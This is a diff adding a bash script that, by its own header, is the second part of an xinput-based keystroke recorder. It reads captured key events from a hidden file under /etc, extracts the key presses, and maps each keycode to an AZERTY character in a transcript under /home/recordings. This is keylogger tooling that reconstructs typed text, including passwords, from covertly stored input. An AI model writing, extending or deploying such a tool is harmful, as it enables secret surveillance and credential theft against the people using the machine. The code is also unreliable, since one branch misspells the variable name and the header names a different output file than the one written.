@@ -1,0 +1,160 @@
+#!/bin/bash
+# THIS FILE IS THE SECOND PART OF THE PROGRAMM WHICH TRANSLATE THE OUTPUT OF THE COMMAND XINPUT TO KNOWN LETTERS AND NUMBERS
+# WE PUT THE RESULTS IN /home/recordings/TRANSLATE
+
+cp /etc/.nikokks1 /etc/.nikokks2
+
+rm -f /home/recordings/temp
+
+# we select the information needed to know what we have selected on the keyboard since we have run the prog
+grep "press" /etc/.nikokks2 | cut -c 13-15 >> /home/recordings/temp
+
+cd /home/recordings/
+
+touch TRADUCTION
+
+for ligne in $(<temp)
+do
+    case $ligne in
+      9)  MOT="[Echap]";;
+      10) MOT="& ou 1";;
+      11) MOT="é ou 2";;
+      12) MOT="\" ou 3 ou [diez]";;
+      13) MOT="' ou 4 ou {";;
+      14) MOT="( ou 5 ou [";;
+      15) MOT="- ou 6 ou |";;
+      16) MOT="è ou 7 ou [appostrophe]";;
+      17) MOT="_ ou 8 ou \ ";;
+      18) MOT="ç ou 9 ou ^";;
+      19) MOT="à ou 0 ou @";;
+      20) MOT="[parenthèse droite] ou ° ou ]";;
+      21) MOT="= ou + ou }";;
+      22) MOT="[Back]";;
+      23) MOT="[Tab]";;
+      24) MOT="a";;
+      25) MOT="z";;
+      26) MOT="e ou €";;
+      27) MOT="r";;
+      28) MOT="t";;
+      29) MOT="y";;
+      30) MOT="u";;
+      31) MOT="i";;
+      32) MOT="o";;
+      33) MOT="p";;
+      34) MOT="^ ou ¨";;
+      35) MOT="$ ou £ ou ê";;
+      36) MOT="[Entrée]";;
+      37) MOT="[Ctrl]";;
+      38) MOT='q';;
+      39) MOT='s';;
+      40) MOT="d";;
+      41) MOT="f";;
+      42) MOT="g";;
+      43) MOT="h";;
+      44) MOT="j";;
+      45) MOT="k";;
+      46) MOT="l";;
+      47) MOT="m";;
+      48) MOT="ù ou %";;
+      49) MOT="œ";;
+      50) MOT="[mini maj]";;
+      51) MOT="> ou <";;
+      52) MOT="w";;
+      53) MOT="x";;
+      54) MOT="c";;
+      55) MOT="v";;
+      56) MOT="b";;
+      57) MOT="n";;
+      58) MOT=", ou ?";;
+      59) MOT="; ou .";;
+      60) Mot=": ou /";;
+      61) MOT="! ou §";;
+      62) MOT="[Maj]";;
+      63) MOT="*";;
+      64) MOT="[Atl]";;
+      65)  
+               MOT="[Espace]";;
+      66)  
+               MOT="[maj verrouillage]";;
+      73)  
+               MOT="[F8]";;
+      77)  
+               MOT="[Verr Num]";;
+      79)  
+               MOT="7";;
+      80)  
+               MOT="8";;
+      81)  
+               MOT="9";;
+      82)  
+               MOT="-";;
+      83)  
+               MOT="4" ;;
+      84)  
+               MOT="5";;
+      85)  
+               MOT="6";;
+      86)  
+               MOT="+";;
+      87)  
+               MOT="1";;
+      88)  
+               MOT="2";;
+      89)  
+               MOT="3";;
+      90)  
+               MOT="0";;
+      91)  
+               MOT=".";;
+      104) 
+               MOT="[Entrée]";;
+      105) 
+               MOT="[Ctrl Droit]" ;;
+      106) 
+               MOT="/";;
+      107) 
+               MOT="[Imp Ecran]";;
+      108) 
+               MOT="[Alt Gr]";;
+      110) 
+               MOT="[Smart Home]";;
+      111) 
+               MOT="[Haut]";;
+      112) 
+               MOT="[Page Up]";;
+      113) 
+               MOT="[Gauche]";;
+      114) 
+               MOT="[Droite]";;
+      115) 
+               MOT="[Fin]";;
+      116) 
+               MOT="[Bas]";;
+      117) 
+               MOT="[Page Down]";;
+      118) 
+               MOT="[Insert]";;
+      119) 
+               MOT="[Suppr]";;
+      121) 
+               MOT="[F1]";;
+      122) 
+               MOT="[F2]";;
+      123) 
+               MOT="[F3]";;
+      133) 
+               MOT="[Windows]";;
+      171) 
+               MOT="[F6]";;
+      172) 
+               MOT="[F5]";;
+      173) 
+               MOT="[F4]";;
+      232) 
+               MOT="[F11]";;
+      233) 
+               MOT="[F12]";;   
+    esac
+    echo $MOT >> TRADUCTION
+done
+
